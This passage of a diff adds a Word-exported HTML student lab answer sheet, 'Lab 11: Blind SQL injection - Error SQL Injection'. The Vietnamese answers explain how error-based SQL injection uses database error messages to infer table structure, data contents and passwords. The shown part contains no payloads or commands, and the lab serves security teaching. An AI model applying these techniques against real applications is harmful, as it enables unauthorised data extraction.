+	mso-level-text:o;
+	mso-level-tab-stop:1.0in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:"Courier New";
+	mso-bidi-font-family:"Times New Roman";}
+@list l6:level3
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:1.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l6:level4
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:2.0in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l6:level5
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:2.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l6:level6
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:3.0in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l6:level7
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:3.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l6:level8
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:4.0in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l6:level9
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0A7;
+	mso-level-tab-stop:4.5in;
+	mso-level-number-position:left;
+	text-indent:-.25in;
+	mso-ansi-font-size:10.0pt;
+	font-family:Wingdings;}
+@list l7
+	{mso-list-id:1674379786;
+	mso-list-type:hybrid;
+	mso-list-template-ids:-787965660 67698707 67698713 67698715 67698703 67698713 67698715 67698703 67698713 67698715;}
+@list l7:level1
+	{mso-level-number-format:roman-upper;
+	mso-level-tab-stop:none;
+	mso-level-number-position:right;
+	text-indent:-.25in;}
+@list l7:level2
+	{mso-level-number-format:alpha-lower;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+@list l7:level3
+	{mso-level-number-format:roman-lower;
+	mso-level-tab-stop:none;
+	mso-level-number-position:right;
+	text-indent:-9.0pt;}
+@list l7:level4
+	{mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+@list l7:level5
+	{mso-level-number-format:alpha-lower;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+@list l7:level6
+	{mso-level-number-format:roman-lower;
+	mso-level-tab-stop:none;
+	mso-level-number-position:right;
+	text-indent:-9.0pt;}
+@list l7:level7
+	{mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+@list l7:level8
+	{mso-level-number-format:alpha-lower;
+	mso-level-tab-stop:none;
+	mso-level-number-position:left;
+	text-indent:-.25in;}
+@list l7:level9
+	{mso-level-number-format:roman-lower;
+	mso-level-tab-stop:none;
+	mso-level-number-position:right;
+	text-indent:-9.0pt;}
+ol
+	{margin-bottom:0in;}
+ul
+	{margin-bottom:0in;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+	{mso-style-name:"Table Normal";
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-priority:99;
+	mso-style-parent:"";
+	mso-padding-alt:0in 5.4pt 0in 5.4pt;
+	mso-para-margin:0in;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:minor-bidi;
+	mso-fareast-language:EN-US;}
+</style>
+<![endif]--><!--[if gte mso 9]><xml>
+ <o:shapedefaults v:ext="edit" spidmax="1027"/>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <o:shapelayout v:ext="edit">
+  <o:idmap v:ext="edit" data="1"/>
+ </o:shapelayout></xml><![endif]-->
+</head>
+
+<body lang=EN-US link="#0563C1" vlink="#954F72" style='tab-interval:.5in;
+word-wrap:break-word'>
+
+<div class=WordSection1>
+
+<div style='mso-element:para-border-div;border:none;border-bottom:solid windowtext 1.0pt;
+mso-border-bottom-alt:solid windowtext .75pt;padding:0in 0in 1.0pt 0in'>
+
+<p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph;
+border:none;mso-border-bottom-alt:solid windowtext .75pt;padding:0in;
+mso-padding-alt:0in 0in 1.0pt 0in'><!--[if gte vml 1]><v:shapetype id="_x0000_t202"
+ coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
+ <v:stroke joinstyle="miter"/>
+ <v:path gradientshapeok="t" o:connecttype="rect"/>
+</v:shapetype><v:shape id="Text_x0020_Box_x0020_1470922860" o:spid="_x0000_s1026"
+ type="#_x0000_t202" style='position:absolute;left:0;text-align:left;
+ margin-left:486.55pt;margin-top:44.25pt;width:537.75pt;height:112.95pt;
+ z-index:251659264;visibility:visible;mso-wrap-style:square;
+ mso-width-percent:0;mso-height-percent:200;mso-wrap-distance-left:9pt;
+ mso-wrap-distance-top:3.6pt;mso-wrap-distance-right:9pt;
+ mso-wrap-distance-bottom:3.6pt;mso-position-horizontal:right;
+ mso-position-horizontal-relative:margin;mso-position-vertical:absolute;
+ mso-position-vertical-relative:text;mso-width-percent:0;mso-height-percent:200;
+ mso-width-relative:margin;mso-height-relative:margin;v-text-anchor:top'
+ o:gfxdata="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
+cgUAAAAA
+">
+ <v:textbox style='mso-fit-shape-to-text:t'>
+  <![if !mso]>
+  <table cellpadding=0 cellspacing=0 width="100%">
+   <tr>
+    <td><![endif]>
+    <div>
+    <p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph'><b><span
+    style='font-size:13.0pt;line-height:106%'>Objective</span></b><span
+    style='font-size:13.0pt;line-height:106%'>: <o:p></o:p></span></p>
+    <p class=MsoListParagraph style='text-align:justify;text-justify:inter-ideograph;
+    text-indent:-.25in;mso-list:l4 level1 lfo1'><![if !supportLists]><span
+    style='font-size:13.0pt;line-height:106%;mso-ascii-font-family:Calibri;
+    mso-fareast-font-family:Calibri;mso-hansi-font-family:Calibri;mso-bidi-font-family:
+    Calibri'><span style='mso-list:Ignore'>-<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    </span></span></span><![endif]><span style='font-size:13.0pt;line-height:
+    106%'>This lab focuses on Error-Based SQL Injection, a method where
+    attackers induce database errors to gather information about the database structure
+    and contents. Participants will work with a simulated web application that
+    is deliberately configured with error-based SQL injection vulnerabilities.<o:p></o:p></span></p>
+    </div>
+    <![if !mso]></td>
+   </tr>
+  </table>
+  <![endif]></v:textbox>
+ <w:wrap type="square" anchorx="margin"/>
+</v:shape><![endif]--><![if !vml]><img width=723 height=156
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image001.png"
+align=right hspace=12 vspace=5
+alt="Text Box: Objective: &#13;&#10;-	This lab focuses on Error-Based SQL Injection, a method where attackers induce database errors to gather information about the database structure and contents. Participants will work with a simulated web application that is deliberately configured with error-based SQL injection vulnerabilities.&#13;&#10;"
+v:shapes="Text_x0020_Box_x0020_1470922860"><![endif]><b><span style='font-size:
+16.0pt;line-height:106%'>Lab 11: Blind SQL injection - Error SQL Injection
+Phongndhe161085</span></b><span style='font-size:16.0pt;line-height:106%'><o:p></o:p></span></p>
+
+</div>
+
+<p class=MsoNormal style='text-align:justify;text-justify:inter-ideograph'><b><span
+style='font-size:16.0pt;line-height:106%'>In this lab, students need to:<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-align:justify;text-justify:inter-ideograph;
+text-indent:-.5in;mso-text-indent-alt:-.25in;mso-list:l7 level1 lfo2'><![if !supportLists]><b><span
+style='font-size:16.0pt;line-height:106%;mso-fareast-font-family:Calibri;
+mso-fareast-theme-font:minor-latin;mso-bidi-font-family:Calibri;mso-bidi-theme-font:
+minor-latin'><span style='mso-list:Ignore'><span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span>I.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span></b><![endif]><b><span style='font-size:16.0pt;line-height:
+106%'>Answer the following questions:<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpLast style='text-align:justify;text-justify:inter-ideograph;
+text-indent:-.25in;mso-list:l7 level2 lfo2'><![if !supportLists]><b><span
+style='font-size:16.0pt;line-height:106%;mso-fareast-font-family:Calibri;
+mso-fareast-theme-font:minor-latin;mso-bidi-font-family:Calibri;mso-bidi-theme-font:
+minor-latin'><span style='mso-list:Ignore'>a.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
+</span></span></span></b><![endif]><b><span style='font-size:16.0pt;line-height:
+106%'>What is an Error-Based SQL Injection attack, and how does it differ from
+other types of SQL injection?<o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-justify:
+inter-ideograph'><span style='font-size:16.0pt;line-height:106%'>Error-Based
+SQL Injection (<span class=SpellE>T&#7845;n</span> <span class=SpellE>công</span>
+<span class=SpellE>tiêm</span> <span class=SpellE>l&#7895;i</span> SQL) <span
+class=SpellE>là</span> <span class=SpellE>m&#7897;t</span> <span class=SpellE>k&#7929;</span>
+<span class=SpellE>thu&#7853;t</span> <span class=SpellE>l&#7907;i</span> <span
+class=SpellE>d&#7909;ng</span> <span class=SpellE>các</span> <span
+class=SpellE>thông</span> <span class=SpellE>báo</span> <span class=SpellE>l&#7895;i</span>
+do <span class=SpellE>máy</span> <span class=SpellE>ch&#7911;</span> <span
+class=SpellE>c&#417;</span> <span class=SpellE>s&#7903;</span> <span
+class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+class=SpellE>tr&#7843;</span> <span class=SpellE>v&#7873;</span> <span
+class=SpellE>&#273;&#7875;</span> <span class=SpellE>trích</span> <span
+class=SpellE>xu&#7845;t</span> <span class=SpellE>thông</span> tin <span
+class=SpellE>t&#7915;</span> <span class=SpellE>c&#417;</span> <span
+class=SpellE>s&#7903;</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span>. <span class=SpellE>Nó</span> <span
+class=SpellE>khác</span> <span class=SpellE>v&#7899;i</span> <span
+class=SpellE>các</span> <span class=SpellE>lo&#7841;i</span> <span
+class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> SQL injection <span
+class=SpellE>khác</span> &#7903; <span class=SpellE>nh&#7919;ng</span> <span
+class=SpellE>&#273;i&#7875;m</span> <span class=SpellE>sau</span>:<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-align:justify;text-justify:inter-ideograph;
+text-indent:-.25in;mso-list:l5 level1 lfo3'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>M&#7909;c</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>tiêu</span>:
+Error-Based SQL Injection <span class=SpellE>không</span> <span class=SpellE>tr&#7921;c</span>
+<span class=SpellE>ti&#7871;p</span> <span class=SpellE>truy</span> <span
+class=SpellE>xu&#7845;t</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span> <span class=SpellE>nh&#432;</span> <span
+class=SpellE>các</span> <span class=SpellE>lo&#7841;i</span> <span
+class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> <span
+class=SpellE>thông</span> <span class=SpellE>th&#432;&#7901;ng</span> (<span
+class=SpellE>ví</span> <span class=SpellE>d&#7909;</span> <span class=SpellE>nh&#432;</span>
+Union-based SQL Injection). Thay <span class=SpellE>vào</span> <span
+class=SpellE>&#273;ó</span>, <span class=SpellE>nó</span> <span class=SpellE>khai</span>
+<span class=SpellE>thác</span> <span class=SpellE>các</span> <span
+class=SpellE>l&#7895;i</span> do <span class=SpellE>truy</span> <span
+class=SpellE>v&#7845;n</span> SQL <span class=SpellE>t&#7841;o</span> <span
+class=SpellE>ra</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>suy</span> <span class=SpellE>lu&#7853;n</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>c&#7845;u</span> <span
+class=SpellE>trúc</span> <span class=SpellE>và</span> <span class=SpellE>n&#7897;i</span>
+dung <span class=SpellE>c&#7911;a</span> <span class=SpellE>c&#417;</span> <span
+class=SpellE>s&#7903;</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l5 level1 lfo3'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>Ph&#7843;n</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>h&#7891;i</span>:
+<span class=SpellE>Không</span> <span class=SpellE>gi&#7889;ng</span> <span
+class=SpellE>nh&#432;</span> <span class=SpellE>các</span> <span class=SpellE>lo&#7841;i</span>
+<span class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> <span
+class=SpellE>tr&#7921;c</span> <span class=SpellE>ti&#7871;p</span> <span
+class=SpellE>tr&#7843;</span> <span class=SpellE>v&#7873;</span> <span
+class=SpellE>k&#7871;t</span> <span class=SpellE>qu&#7843;</span> <span
+class=SpellE>trong</span> <span class=SpellE>trang</span> web, Error-Based SQL
+Injection <span class=SpellE>d&#7921;a</span> <span class=SpellE>trên</span> <span
+class=SpellE>s&#7921;</span> <span class=SpellE>thay</span> <span class=SpellE>&#273;&#7893;i</span>
+<span class=SpellE>hành</span> vi <span class=SpellE>c&#7911;a</span> <span
+class=SpellE>trang</span> web <span class=SpellE>ho&#7863;c</span> <span
+class=SpellE>thông</span> <span class=SpellE>báo</span> <span class=SpellE>l&#7895;i</span>
+<span class=SpellE>&#273;&#432;&#7907;c</span> <span class=SpellE>hi&#7875;n</span>
+<span class=SpellE>th&#7883;</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l5 level1 lfo3'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>Ph&#7913;c</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>t&#7841;p</span>:
+Error-Based SQL Injection <span class=SpellE>th&#432;&#7901;ng</span> <span
+class=SpellE>ph&#7913;c</span> <span class=SpellE>t&#7841;p</span> <span
+class=SpellE>h&#417;n</span> <span class=SpellE>các</span> <span class=SpellE>lo&#7841;i</span>
+<span class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> <span
+class=SpellE>khác</span> <span class=SpellE>vì</span> <span class=SpellE>&#273;òi</span>
+<span class=SpellE>h&#7887;i</span> <span class=SpellE>nhi&#7873;u</span> <span
+class=SpellE>thao</span> <span class=SpellE>tác</span> <span class=SpellE>và</span>
+<span class=SpellE>phân</span> <span class=SpellE>tích</span> <span
+class=SpellE>l&#7895;i</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>trích</span> <span class=SpellE>xu&#7845;t</span> <span
+class=SpellE>thông</span> tin <span class=SpellE>chính</span> <span
+class=SpellE>xác</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph'><b><span style='font-size:16.0pt;line-height:106%'><o:p>&nbsp;</o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l7 level2 lfo2'><![if !supportLists]><b><span
+style='font-size:16.0pt;line-height:106%;mso-fareast-font-family:Calibri;
+mso-fareast-theme-font:minor-latin;mso-bidi-font-family:Calibri;mso-bidi-theme-font:
+minor-latin'><span style='mso-list:Ignore'>b.<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;
+</span></span></span></b><![endif]><b><span style='font-size:16.0pt;line-height:
+106%'>Explain the concept of using database errors to extract <span
+class=GramE>information, and</span> describe the typical signs that a web
+application might be vulnerable to this type of attack.<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph'><span class=SpellE><b><span style='font-size:16.0pt;
+line-height:106%'>S&#7917;</span></b></span><b><span style='font-size:16.0pt;
+line-height:106%'> <span class=SpellE>d&#7909;ng</span> <span class=SpellE>l&#7895;i</span>
+<span class=SpellE>c&#417;</span> <span class=SpellE>s&#7903;</span> <span
+class=SpellE>d&#7919;</span> <span class=SpellE>li&#7879;u</span> <span
+class=SpellE>&#273;&#7875;</span> <span class=SpellE>trích</span> <span
+class=SpellE>xu&#7845;t</span> <span class=SpellE>thông</span> tin:<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:.25in;mso-add-space:
+auto;text-align:justify;text-justify:inter-ideograph'><span style='font-size:
+16.0pt;line-height:106%'>Trong <span class=SpellE>t&#7845;n</span> <span
+class=SpellE>công</span> Error-Based SQL Injection, <span class=SpellE>k&#7867;</span>
+<span class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> <span
+class=SpellE>c&#7889;</span> <span class=SpellE>g&#7855;ng</span> <span
+class=SpellE>thao</span> <span class=SpellE>túng</span> <span class=SpellE>truy</span>
+<span class=SpellE>v&#7845;n</span> SQL <span class=SpellE>sao</span> <span
+class=SpellE>cho</span> <span class=SpellE>nó</span> <span class=SpellE>t&#7841;o</span>
+<span class=SpellE>ra</span> <span class=SpellE>l&#7895;i</span>. <span
+class=SpellE>B&#7857;ng</span> <span class=SpellE>cách</span> <span
+class=SpellE>phân</span> <span class=SpellE>tích</span> <span class=SpellE>n&#7897;i</span>
+dung <span class=SpellE>và</span> <span class=SpellE>th&#7901;i</span> <span
+class=SpellE>gian</span> <span class=SpellE>xu&#7845;t</span> <span
+class=SpellE>hi&#7879;n</span> <span class=SpellE>c&#7911;a</span> <span
+class=SpellE>l&#7895;i</span>, <span class=SpellE>k&#7867;</span> <span
+class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> <span
+class=SpellE>có</span> <span class=SpellE>th&#7875;</span> <span class=SpellE>suy</span>
+<span class=SpellE>lu&#7853;n</span> <span class=SpellE>v&#7873;</span>:<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l3 level1 lfo4'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>C&#7845;u</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>trúc</span> <span
+class=SpellE>b&#7843;ng</span>: <span class=SpellE>S&#7889;</span> <span
+class=SpellE>l&#432;&#7907;ng</span> <span class=SpellE>c&#7897;t</span>, <span
+class=SpellE>ki&#7875;u</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span> <span class=SpellE>c&#7911;a</span> <span
+class=SpellE>các</span> <span class=SpellE>c&#7897;t</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l3 level1 lfo4'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>N&#7897;i</span></span><span
+style='font-size:16.0pt;line-height:106%'> dung <span class=SpellE>d&#7919;</span>
+<span class=SpellE>li&#7879;u</span>: <span class=SpellE>Ki&#7875;m</span> <span
+class=SpellE>tra</span> <span class=SpellE>s&#7921;</span> <span class=SpellE>t&#7891;n</span>
+<span class=SpellE>t&#7841;i</span> <span class=SpellE>c&#7911;a</span> <span
+class=SpellE>m&#7897;t</span> <span class=SpellE>giá</span> <span class=SpellE>tr&#7883;</span>
+<span class=SpellE>c&#7909;</span> <span class=SpellE>th&#7875;</span> (<span
+class=SpellE>ví</span> <span class=SpellE>d&#7909;</span>: <span class=SpellE>tên</span>
+<span class=SpellE>&#273;&#259;ng</span> <span class=SpellE>nh&#7853;p</span>),
+<span class=SpellE>th&#7853;m</span> <span class=SpellE>chí</span> <span
+class=SpellE>có</span> <span class=SpellE>th&#7875;</span> <span class=SpellE>&#273;oán</span>
+<span class=SpellE>giá</span> <span class=SpellE>tr&#7883;</span> <span
+class=SpellE>chính</span> <span class=SpellE>xác</span> <span class=SpellE>b&#7857;ng</span>
+<span class=SpellE>k&#7929;</span> <span class=SpellE>thu&#7853;t</span> &quot;<span
+class=SpellE>dò</span> password&quot;.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l3 level1 lfo4'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
+class=SpellE><span style='font-size:16.0pt;line-height:106%'>S&#7889;</span></span><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>l&#432;&#7907;ng</span>
+<span class=SpellE>b&#7843;n</span> <span class=SpellE>ghi</span>: <span
+class=SpellE>Ki&#7875;m</span> <span class=SpellE>tra</span> <span
+class=SpellE>xem</span> <span class=SpellE>truy</span> <span class=SpellE>v&#7845;n</span>
+<span class=SpellE>tr&#7843;</span> <span class=SpellE>v&#7873;</span> <span
+class=SpellE>k&#7871;t</span> <span class=SpellE>qu&#7843;</span> hay <span
+class=SpellE>không</span> <span class=SpellE>&#273;&#7875;</span> <span
+class=SpellE>suy</span> <span class=SpellE>lu&#7853;n</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>s&#7921;</span> <span
+class=SpellE>t&#7891;n</span> <span class=SpellE>t&#7841;i</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>d&#7919;</span> <span
+class=SpellE>li&#7879;u</span>.<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:.25in;mso-add-space:
+auto;text-align:justify;text-justify:inter-ideograph'><span class=SpellE><b><span
+style='font-size:16.0pt;line-height:106%'>D&#7845;u</span></b></span><b><span
+style='font-size:16.0pt;line-height:106%'> <span class=SpellE>hi&#7879;u</span>
+<span class=SpellE>&#7913;ng</span> <span class=SpellE>d&#7909;ng</span> web <span
+class=SpellE>d&#7877;</span> <span class=SpellE>b&#7883;</span> <span
+class=SpellE>t&#7845;n</span> <span class=SpellE>công</span> Error-Based SQL
+Injection:<o:p></o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-align:justify;text-justify:
+inter-ideograph;text-indent:-.25in;mso-list:l2 level1 lfo5'><![if !supportLists]><span
+style='font-size:16.0pt;line-height:106%;font-family:Symbol;mso-fareast-font-family:
+Symbol;mso-bidi-font-family:Symbol'><span style='mso-list:Ignore'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]><span
